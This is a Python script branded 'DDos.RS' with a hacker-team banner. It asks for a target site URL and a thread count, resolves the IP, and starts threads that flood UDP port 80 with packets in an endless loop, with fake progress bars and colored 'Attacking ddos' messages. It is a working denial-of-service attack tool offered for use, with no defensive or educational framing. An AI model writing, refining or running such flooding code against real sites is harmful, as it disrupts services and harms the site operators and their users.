import time
import os
import socket
import sys
import _thread
class colorma:

    CYAN = '\033[96m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDER = '\033[4m'
    #--- ITS END ---
    END = '\033[0m'

print(f" \n          [withing...]{colorma.GREEN}")
time.sleep(2)

os.system("clear")

print(f"{colorma.RED}")
print(f"\n[#10٪]{colorma.RED}")
time.sleep(0.2)
print(f"\n[##15٪]{colorma.RED}")
time.sleep(0.2)
print("\n[###20٪]")
time.sleep(0.2)
print("\n[####25٪]")
time.sleep(0.2)
print("\n[#####30٪]")
time.sleep(0.2)
print("\n[######35٪]")
time.sleep(0.2)
print("\n[#######40٪]")
time.sleep(0.2)
print("\n[########45٪]")
time.sleep(0.2)
print("\n[#########50٪]")
time.sleep(0.2)
print("\n[##########55٪]")
time.sleep(0.2)
print("\n[###########60٪]")
time.sleep(0.2)
print("\n[############65٪]")
time.sleep(0.2)
print("\n[#############70٪]")
time.sleep(0.2)
print("\n[##############75٪]")
time.sleep(0.2)
print("\n[###############80٪]")
time.sleep(0.2)
print("\n[################85٪]")
time.sleep(0.2)
print("\n[#################90٪]")
time.sleep(0.2)
print("\n[##################95٪]")
time.sleep(0.2)
print("\n[###################100٪]")
time.sleep(0.2)
os.system("clear")
print(f" \n                           ~.....D.....~{colorma.GREEN}")
time.sleep(0.5)
print(f" \n                           ~.....D.....~{colorma.RED}")
time.sleep(0.5)
print(f" \n                           ~.....O.....~{colorma.GREEN}")
time.sleep(0.5)
print(f" \n                           ~.....S.....~{colorma.RED}")
time.sleep(0.5)
print(f" \n                           ~.....R.....~{colorma.GREEN}")
time.sleep(0.5)
print(f" \n                           ~.....S.....~{colorma.RED}")
time.sleep(0.5)
os.system("clear")

print("""
       ██████╗ ██████╗  ██████╗ ███████╗    ██████╗ ███████╗
       ██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ██╔══██╗██╔════╝
       ██║  ██║██║  ██║██║   ██║███████╗    ██████╔╝███████╗
       ██║  ██║██║  ██║██║   ██║╚════██║    ██╔══██╗╚════██║
       ██████╔╝██████╔╝╚██████╔╝███████║    ██║  ██║███████║
       ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚═╝  ╚═╝╚══════╝
""")

print(f""" \n {colorma.CYAN}
                  ____________________________
                 |          DDos.RS           |
                 |----------------------------|
                 |Author of tools : REZA.HACK |
                 |Team name : BAX_CYBERY{colorma.CYAN}      |
                 |instagram : reza_hs15       |
                 |____________________________| 
                      """)
site = input(f"Enter your site url :-»")
thread_count = input(f"Enter your thread :-» ")
ip = socket.gethostbyname(site)
UDP_PORT = 80
MESSAGE = 'virus32'
print("UDP target IP:", ip)
print("UDP target port:", UDP_PORT)
time.sleep(3)
def ddos(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        print(f"HEAVY DDOs WITH RS{colorma.RED}______Packet Sent_____Attacking ddos{colorma.GREEN}")
        print(f"HEAVY DDOs WITH RS{colorma.RED}______Packet Sent_____Attacking ddos{colorma.YELLOW}")
        print(f"HEAVY DDOs WITH RS{colorma.RED}______Packet Sent_____Attacking ddos{colorma.GREEN}")
        
for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
    except KeyboardInterrupt:
        sys.exit(0)
while 1:
    pass
